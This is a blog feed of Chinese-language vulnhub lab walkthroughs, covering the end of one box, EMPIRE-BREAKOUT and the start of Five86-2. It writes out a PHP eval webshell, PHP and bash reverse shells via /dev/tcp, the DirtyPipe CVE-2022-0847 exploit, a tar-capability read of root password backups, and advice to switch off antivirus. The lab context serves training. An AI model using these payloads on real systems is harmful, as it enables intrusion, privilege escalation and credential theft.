language-none"><code class="language-none">graffiti.txtgraffiti.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>接下来我们访问这两个php,txt文件</p><h3 id="3-渗透测试-1"><a href="#3-渗透测试-1" class="headerlink" title="(3)渗透测试"></a>(3)渗透测试</h3><h4 id="1-访问graffiti-php页面"><a href="#1-访问graffiti-php页面" class="headerlink" title="1)访问graffiti.php页面"></a>1)访问graffiti.php页面</h4><p>我们可以看到有一个输入框，我们输入MS02423,看到返回页面显示了MS02423</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240126221929278.png" alt="image-20240126221929278"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240126222001551.png" alt="image-20240126222001551"></p><h4 id="2-访问graffiti-txt页面"><a href="#2-访问graffiti-txt页面" class="headerlink" title="2)访问graffiti.txt页面"></a>2)访问graffiti.txt页面</h4><p>我们可以看到返回页面和graffiti.php页面是一样的</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240126222026957.png" alt="image-20240126222026957"></p><p>然后我们进行抓包看看，我们可以看到变量名是file</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240127205656535.png" alt="image-20240127205656535"></p><p>此处有一个file变量，那么改变file变量可以直接对靶机文件修改，能随意创建文件,二话不说写个马，准备反弹shell</p><h4 id="3-抓包写入一句话木马"><a href="#3-抓包写入一句话木马" class="headerlink" title="3)抓包写入一句话木马"></a>3)抓包写入一句话木马</h4><p>在burp里面空格要使用+号代替</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">message</span><span class="token operator">=</span><span class="token operator">&lt;</span>?php+@eval<span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>MS02423<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">>&amp;</span><span class="token assign-left variable">file</span><span class="token operator">=</span>MS02423.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240127210157312.png" alt="image-20240127210157312"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">在写入一句话木马的时候，大家一定要把火绒关闭，不然的话会把杀掉<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240127211015900.png" alt="image-20240127211015900"></p><p>蚁剑连接成功，我们可以看到一些文件，但是都没有什么用</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240127211104975.png" alt="image-20240127211104975"></p><p>我们进入虚拟终端看看有没有什么东西，最后发现了一个flag 1</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240127211735204.png" alt="image-20240127211735204"></p><p>我们找到了Flag 1!,提示我们从80端口的Web服务器中提取此图像以获得另外一个flag，图像的名称叫&#x2F;.cypher-neo.png,可以看到是一个隐藏文件。</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240127212421628.png" alt="image-20240127212421628"></p><h4 id="4-反弹webshell"><a href="#4-反弹webshell" class="headerlink" title="4)反弹webshell"></a>4)反弹webshell</h4><p>蚁剑的文件不是完整的，可能会有隐藏文件，此处简单一点直接在反弹shell双管齐下（一句话魔改一下）（记得要弄url编码）（干掉问号和空格和&amp;）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&lt;</span>?php exec<span class="token punctuation">(</span><span class="token string">"/bin/bash -c 'bash -i >&amp; /dev/tcp/192.168.52.152/666 0>&amp;1'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> ?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编码之后,访问文件即可即可反弹shell</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">%3C%3Fphp+exec%28%22%2Fbin%2Fbash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.52.152%2F666+0%3E%261%27%22%29%3B+%3F%3E  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240127213134624.png" alt="image-20240127213134624"></p><p>浏览器访问即可</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;192.168.52.152&#x2F;3.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我们使用ls -la 可以看到隐藏图片，我们进行下载到kali</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240127213800385.png" alt="image-20240127213800385"></p><h4 id="5-分析图片"><a href="#5-分析图片" class="headerlink" title="5)分析图片"></a>5)分析图片</h4><p>我们访问图片</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.52.135/.cypher-neo.png<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240127214218700.png" alt="image-20240127214218700"></p><p>问题就是它了，网站上看不出来问题下载下看看，这里用到了一下图片隐写的知识</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> http://192.168.52.135/.cypher-neo.pngbinwalk .cypher-neo.png<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240127214457908.png" alt="image-20240127214457908"></p><p>！！！！捆绑好家伙行</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">binwalk <span class="token parameter variable">-e</span> .cypher-neo.png --run-as<span class="token operator">=</span>root<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240127214753334.png" alt="image-20240127214753334"></p><p>研究了半天都没有研究出来什么东西，我们直接进行提权看看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240127221919347.png" alt="image-20240127221919347"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240127222202901.png" alt="image-20240127222202901"></p><h4 id="6-进行提权"><a href="#6-进行提权" class="headerlink" title="6)进行提权"></a>6)进行提权</h4><p>查看一下当前linux的内核版本</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">uname</span> <span class="token parameter variable">-a</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240127222852117.png" alt="image-20240127222852117"></p><p>系统是Linux4.x|5.x看看有没有漏洞能利用，直接发现有漏洞能直接用CVE-2022-0847</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">https://github.com/r1is/CVE-2022-0847<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>下载下去直接传上去跑就行（蚁剑直接传上去就可以了）（或者使用shell直接到靶机里）,给权限直接跑</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240127224523016.png" alt="image-20240127224523016"></p><p>蚁剑里面有bug，我们反弹shell，在kali里面进行</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240127225053522.png" alt="image-20240127225053522"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240127225211867.png" alt="image-20240127225211867"></p><p>我们可以看到提权已经是root了，我们直接查看flag即可</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240127225252646.png" alt="image-20240127225252646"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240127225316320.png" alt="image-20240127225316320"></p><h1 id="三-相关资源"><a href="#三-相关资源" class="headerlink" title="三.相关资源"></a>三.相关资源</h1><p>1.靶场下载地址 </p><p>2.nmap</p><p>3.arp-scan </p><p>4.masscan </p><p>5.[ 常用工具篇 ] 渗透神器 whatweb 安装使用详解 </p><p>6.[ 渗透工具篇 ] EHole(棱洞)3.0安装部署及详解（linux &amp; win） </p><p>7.nikto工具的使用</p><p>8.dirsearch目录扫描</p><p>9.burp工具的使用</p><p>10.kali反弹shell</p><p>11.蚁剑的使用</p><p>12.gobuster.ffuf</p><p>13.binwalk工具的使用</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一-环境搭建&quot;&gt;&lt;a href=&quot;#一-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;一.环境搭建&quot;&gt;&lt;/a&gt;一.环境搭建&lt;/h1&gt;&lt;h2 id=&quot;1-靶场描述&quot;&gt;&lt;a href=&quot;#1-靶场描述&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://ms02423.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="vulnhub靶场" scheme="http://ms02423.top/tags/vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub靶场之EMPIRE-BREAKOUT</title>
    <link href="http://ms02423.top/2024/01/15/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BEMPIRE-BREAKOUT/"/>
    <id>http://ms02423.top/2024/01/15/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BEMPIRE-BREAKOUT/</id>
    <published>2024-01-15T12:18:46.000Z</published>
    <updated>2024-01-29T15:45:26.122Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-环境搭建"><a href="#一-环境搭建" class="headerlink" title="一.环境搭建"></a>一.环境搭建</h1><h2 id="1-靶场描述"><a href="#1-靶场描述" class="headerlink" title="1.靶场描述"></a>1.靶场描述</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">DescriptionBack <span class="token keyword">to</span> the <span class="token keyword">Top</span>Difficulty<span class="token punctuation">:</span> EasyThis box was created <span class="token keyword">to</span> be an Easy box<span class="token punctuation">,</span> but it can be Medium <span class="token keyword">if</span> you get lost<span class="token punctuation">.</span><span class="token keyword">For</span> hints discord Server <span class="token punctuation">(</span> https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>discord<span class="token punctuation">.</span>gg<span class="token operator">/</span>7asvAhCEhe <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-靶场地址"><a href="#2-靶场地址" class="headerlink" title="2.靶场地址"></a>2.靶场地址</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>vulnhub<span class="token punctuation">.</span>com<span class="token operator">/</span><span class="token keyword">entry</span><span class="token operator">/</span>empire-breakout<span class="token punctuation">,</span><span class="token number">751</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115202624114.png" alt="image-20240115202624114"></p><h2 id="3-启动靶场"><a href="#3-启动靶场" class="headerlink" title="3.启动靶场"></a>3.启动靶场</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115202638120.png" alt="image-20240115202638120"></p><p>虚拟机开启之后界面如上，我们不知道ip，需要自己探活，网段知道：192.168.52.0&#x2F;24</p><h1 id="二-渗透测试"><a href="#二-渗透测试" class="headerlink" title="二.渗透测试"></a>二.渗透测试</h1><h2 id="1-目标"><a href="#1-目标" class="headerlink" title="1.目标"></a>1.目标</h2><p>目标就是我们搭建的靶场，靶场IP为：192.168.52.0&#x2F;24</p><h2 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2.信息收集"></a>2.信息收集</h2><h3 id="1-寻找靶场真实ip"><a href="#1-寻找靶场真实ip" class="headerlink" title="(1)寻找靶场真实ip"></a>(1)寻找靶场真实ip</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.52.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115202948264.png" alt="image-20240115202948264"></p><pre class="line-numbers language-none"><code class="language-none">arp-scan -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115203526580.png" alt="image-20240115203526580"></p><p>靶场真实ip地址为192.168.52.134</p><h3 id="2-探测端口及服务"><a href="#2-探测端口及服务" class="headerlink" title="(2)探测端口及服务"></a>(2)探测端口及服务</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-A</span> <span class="token parameter variable">-v</span> -p- <span class="token number">192.168</span>.52.134<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115203205199.png" alt="image-20240115203205199"></p><p>这里我们不使用这个命令，这个命令看起来太麻烦了，我们使用另一个命令，更加直观</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -p- <span class="token parameter variable">-sV</span> <span class="token number">192.168</span>.52.134<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115203444747.png" alt="image-20240115203444747"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">发现开启了<span class="token number">80</span>端口，APache httpd <span class="token number">2.4</span><span class="token number">.51</span><span class="token punctuation">(</span><span class="token punctuation">(</span>Debian<span class="token punctuation">)</span><span class="token punctuation">)</span>发现开启了<span class="token number">139,445</span>端口，Samba smbd <span class="token number">4.6</span><span class="token number">.2</span>发现开启了<span class="token number">10000,20000</span>端口， MiniServ <span class="token number">1.830</span> <span class="token punctuation">(</span>Webmin httpd<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>也可以使用masscan进行探测</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115203636268.png" alt="image-20240115203636268"></p><h3 id="3-web指纹识别"><a href="#3-web指纹识别" class="headerlink" title="(3)web指纹识别"></a>(3)web指纹识别</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">whatweb <span class="token parameter variable">-v</span> <span class="token number">192.168</span>.52.134<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115204012504.png" alt="image-20240115204012504"></p><h2 id="3-渗透测试"><a href="#3-渗透测试" class="headerlink" title="3.渗透测试"></a>3.渗透测试</h2><h3 id="1-访问web服务"><a href="#1-访问web服务" class="headerlink" title="(1)访问web服务"></a>(1)访问web服务</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.52.134<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115204153015.png" alt="image-20240115204153015"></p><p>是一个apache2页面，我们查看源码，可以看到一个加密的过后的字符串，我们进行解密</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115204250195.png" alt="image-20240115204250195"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115205820955.png" alt="image-20240115205820955"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">.2uqPEfj3D<span class="token operator">&lt;</span>P'a-3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这应该是一个密码，先记录下来，接着我们继续查看另外两个网站</p><p> 10000端口和20000端口是不同的登录系统，一个是登录网站的，一个是登录用户的</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115204936324.png" alt="image-20240115204936324"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115204954830.png" alt="image-20240115204954830"></p><h3 id="2-扫描web服务"><a href="#2-扫描web服务" class="headerlink" title="(2)扫描web服务"></a>(2)扫描web服务</h3><h4 id="1-棱洞3-0指纹识别"><a href="#1-棱洞3-0指纹识别" class="headerlink" title="1)棱洞3.0指纹识别"></a>1)棱洞3.0指纹识别</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./EHole_linux_amd64 finger <span class="token parameter variable">-u</span> http://192.168.52.134<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115204419404.png" alt="image-20240115204419404"></p><p>没有有用的信息</p><h4 id="2-nikto扫描网站结构"><a href="#2-nikto扫描网站结构" class="headerlink" title="2)nikto扫描网站结构"></a>2)nikto扫描网站结构</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nikto <span class="token parameter variable">-h</span> http://192.168.52.134<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115204742223.png" alt="image-20240115204742223"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115204808713.png" alt="image-20240115204808713"></p><p>但是没有什么用</p><h4 id="3-dirsearch目录扫描"><a href="#3-dirsearch目录扫描" class="headerlink" title="3)dirsearch目录扫描"></a>3)dirsearch目录扫描</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirsearch <span class="token parameter variable">-u</span> <span class="token number">192.168</span>.52.134 <span class="token parameter variable">-e</span> * <span class="token parameter variable">-x</span> <span class="token number">403</span> --random-agent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115205327708.png" alt="image-20240115205327708"></p><p>没有任何信息</p><h3 id="3-渗透测试-1"><a href="#3-渗透测试-1" class="headerlink" title="(3)渗透测试"></a>(3)渗透测试</h3><h4 id="1-enum4linux-收集用户"><a href="#1-enum4linux-收集用户" class="headerlink" title="1)enum4linux 收集用户"></a>1)enum4linux 收集用户</h4><p>我们已经有了用户的密码，所以我们要着手寻找用户名了,由于靶机开放了smb服务，所以我们可以收集有关靶机smb的信息, 使用命令enum4linux可以收集大量的信息</p><p>Enum4linux 是一个用于枚举和收集信息的开源工具，特别是在Windows环境下进行。它设计用于与SMB&#x2F;CIFS（Server Message Block&#x2F;Common Internet File System）协议交互，该协议通常用于在Windows网络中共享文件和打印机。<br>以下是 Enum4linux 的主要功能：<br>用户和组枚举： Enum4linux 可以列出目标系统上的用户和组，包括一些敏感信息，如用户ID（UID）、组ID（GID）、用户描述等。<br>共享枚举： 它可以枚举目标系统上的共享资源，包括共享名称、共享路径和共享类型。<br>策略枚举： 工具可以提取目标系统的安全策略信息，包括密码策略和帐户锁定策略。<br>会话和会话枚举： 它可以列举活动会话，显示与系统相关的用户信息。<br>操作系统版本信息： Enum4linux 试图识别目标系统的操作系统版本。</p><pre class="line-numbers language-none"><code class="language-none">enum4linux 192.168.52.134<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115210318907.png" alt="image-20240115210318907"></p><p>获得了一个用户名cyber</p><h4 id="2-登录用户名"><a href="#2-登录用户名" class="headerlink" title="2)登录用户名"></a>2)登录用户名</h4><p>登录一下20000端口,登录进去一看，发现左下角有一个终端的图标，点进去之后就可以运行命令了</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115210853717.png" alt="image-20240115210853717"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115210944182.png" alt="image-20240115210944182"></p><p>我们可以找到第一个flag</p><h3 id="4-提权"><a href="#4-提权" class="headerlink" title="(4)提权"></a>(4)提权</h3><p>我们查看权限，不是root权限，我们进行提权</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115211201249.png" alt="image-20240115211201249"></p><p>我们先反弹shell</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115211424046.png" alt="image-20240115211424046"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115211412338.png" alt="image-20240115211412338"></p><p>我们可以看到反弹成功</p><p>除了user.txt,还发现一个 tar 文件，查看一下文件的相关属性</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115211811673.png" alt="image-20240115211811673"></p><p>突然给这么一个可运行文件肯定是有深意的，我们看一下这个文件拥有的权限是什么</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">getcap <span class="token function">tar</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115212155675.png" alt="image-20240115212155675"></p><p>getcap是一个Linux命令，用于获取文件的能力（capabilities）信息。在Linux中，能力是一种粒度更细的权限系统，用于授予进程执行特定操作的权限，而不是传统的用户和组权限模型。</p><p>发现有 cap_dac_read_search&#x3D;ep 功能，能读取文件，发现它是可以读取任意文件的,有关linux setcap命令的信息,查看下面链接</p><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;iamfy&#x2F;archive&#x2F;2012&#x2F;09&#x2F;20&#x2F;2694977.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>后来在 &#x2F;var&#x2F;backups 目录下发现了一个密码备份文件：</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115212857546.png" alt="image-20240115212857546"></p><p>其实如果我们想在kali里面寻找文件，我们可以使用如下命令</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> <span class="token parameter variable">-name</span> <span class="token string">"*bak*"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115213621962.png" alt="image-20240115213621962"></p><p>只能由root用户读取，不过之前发现 tar 可以读取任意文件，那就用 tar 读取文件</p><p>tar tar -tvf archive.tar</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115213856570.png" alt="image-20240115213856570"></p><p>我们用tar把它打包之后再解压出来，就没有权限问题了</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./tar <span class="token parameter variable">-cvf</span> MS02423.tar /var/backups/.old_pass.bak <span class="token function">tar</span> <span class="token parameter variable">-xvf</span> MS02423.tar<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115215554730.png" alt="image-20240115215554730"></p><p>cat之后获得了root密码</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115215623797.png" alt="image-20240115215623797"></p><p>我们登录root，但是发现这里有bug</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115220415090.png" alt="image-20240115220415090"></p><p>那么我们就反弹shell</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115222410774.png" alt="image-20240115222410774"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">bash</span> <span class="token parameter variable">-i</span> <span class="token operator">>&amp;</span> /dev/tcp/192.168.52.152/666666 <span class="token operator"><span class="token file-descriptor important">0</span>></span><span class="token file-descriptor important">&amp;1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115220344317.png" alt="image-20240115220344317"></p><p>可反弹成功，在此登录root就可以看到最终的flag了</p><h1 id="三-相关资源"><a href="#三-相关资源" class="headerlink" title="三.相关资源"></a>三.相关资源</h1><p>1.靶场下载地址 </p><p>2.nmap</p><p>3.arp-scan </p><p>4.masscan </p><p>5.[ 常用工具篇 ] 渗透神器 whatweb 安装使用详解 </p><p>6.[ 渗透工具篇 ] EHole(棱洞)3.0安装部署及详解（linux &amp; win） </p><p>7.nikto工具的使用</p><p>8.dirsearch目录扫描</p><p>9.enum4linux 工具的使用</p><p>10.kali反弹shell</p><p>11.tar</p><p>12.getcap</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一-环境搭建&quot;&gt;&lt;a href=&quot;#一-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;一.环境搭建&quot;&gt;&lt;/a&gt;一.环境搭建&lt;/h1&gt;&lt;h2 id=&quot;1-靶场描述&quot;&gt;&lt;a href=&quot;#1-靶场描述&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://ms02423.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="vulnhub靶场" scheme="http://ms02423.top/tags/vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub靶场之Five86-2</title>
    <link href="http://ms02423.top/2024/01/13/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BFive86-2/"/>
    <id>http://ms02423.top/2024/01/13/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BFive86-2/</id>
    <published>2024-01-13T09:48:36.000Z</published>
    <updated>2024-01-14T14:00:12.755Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-环境搭建"><a href="#一-环境搭建" class="headerlink" title="一.环境搭建"></a>一.环境搭建</h1><h2 id="1-靶场描述"><a href="#1-靶场描述" class="headerlink" title="1.靶场描述"></a>1.靶场描述</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">Five86-2 <span class="token keyword">is</span> another purposely built vulnerable lab <span class="token keyword">with</span> the intent <span class="token keyword">of</span> gaining experience <span class="token keyword">in</span> the world <span class="token keyword">of</span> penetration testing<span class="token punctuation">.</span>The ultimate goal <span class="token keyword">of</span> this challenge <span class="token keyword">is</span> <span class="token keyword">to</span> get root <span class="token operator">and</span> <span class="token keyword">to</span> <span class="token keyword">read</span> the one <span class="token operator">and</span> only flag<span class="token punctuation">.</span>Linux skills <span class="token operator">and</span> familiarity <span class="token keyword">with</span> the Linux command <span class="token keyword">line</span> <span class="token keyword">are</span> a must<span class="token punctuation">,</span> <span class="token keyword">as</span> <span class="token keyword">is</span> some experience <span class="token keyword">with</span> basic penetration testing tools<span class="token punctuation">.</span><span class="token keyword">For</span> beginners<span class="token punctuation">,</span> Google can be <span class="token keyword">of</span> great assistance<span class="token punctuation">,</span> but you can always tweet me <span class="token keyword">at</span> @DCAU7 <span class="token keyword">for</span> assistance <span class="token keyword">to</span> get you going again<span class="token punctuation">.</span> But take note<span class="token punctuation">:</span> I wo<span class="token string">n't give you the answer, instead, I'</span>ll give you an idea about how <span class="token keyword">to</span> <span class="token keyword">move</span> forward<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>只有一个flag</p><h2 id="2-靶场地址"><a href="#2-靶场地址" class="headerlink" title="2.靶场地址"></a>2.靶场地址</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">https://www.vulnhub.com/entry/five86-2,418/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113205448765.png" alt="image-20240113205448765"></p><h2 id="3-启动环境"><a href="#3-启动环境" class="headerlink" title="3.启动环境"></a>3.启动环境</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113205423777.png" alt="image-20240113205423777"></p><p>虚拟机开启之后界面如上，我们不知道ip，需要自己探活，网段知道：192.168.52.0&#x2F;24</p><h1 id="二-渗透测试"><a href="#二-渗透测试" class="headerlink" title="二.渗透测试"></a>二.渗透测试</h1><h2 id="1-目标"><a href="#1-目标" class="headerlink" title="1.目标"></a>1.目标</h2><p>目标就是我们搭建的靶场，靶场IP为：192.168.52.0&#x2F;24</p><h2 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2.信息收集"></a>2.信息收集</h2><h3 id="1-寻找靶场真实ip"><a href="#1-寻找靶场真实ip" class="headerlink" title="(1)寻找靶场真实ip"></a>(1)寻找靶场真实ip</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.52.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113210129437.png" alt="image-20240113210129437"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">arp-scan <span class="token parameter variable">-l</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113210452368.png" alt="image-20240113210452368"></p><p>靶场真实ip地址为192.168.52.133</p><h3 id="2-探测端口及服务"><a href="#2-探测端口及服务" class="headerlink" title="(2)探测端口及服务"></a>(2)探测端口及服务</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-A</span> <span class="token parameter variable">-v</span> -p- <span class="token number">192.168</span>.52.133<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113210410583.png" alt="image-20240113210410583"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">发现开启了<span class="token number">21</span>端口， ProFTPD <span class="token number">1.3</span><span class="token punctuation">.</span>5e发现开启了<span class="token number">80</span>端口，Apache httpd <span class="token number">2.4</span><span class="token number">.41</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>也可以使用masscan进行探测</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">masscan <span class="token parameter variable">--rate</span><span class="token operator">=</span><span class="token number">10000</span> <span class="token parameter variable">--ports</span> <span class="token number">0</span>-65535 <span class="token number">192.168</span>.52.133<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113210542180.png" alt="image-20240113210542180"></p><h3 id="3-web指纹识别"><a href="#3-web指纹识别" class="headerlink" title="(3)web指纹识别"></a>(3)web指纹识别</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">whatweb <span class="token parameter variable">-v</span> <span class="token number">192.168</span>.52.133<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113210841008.png" 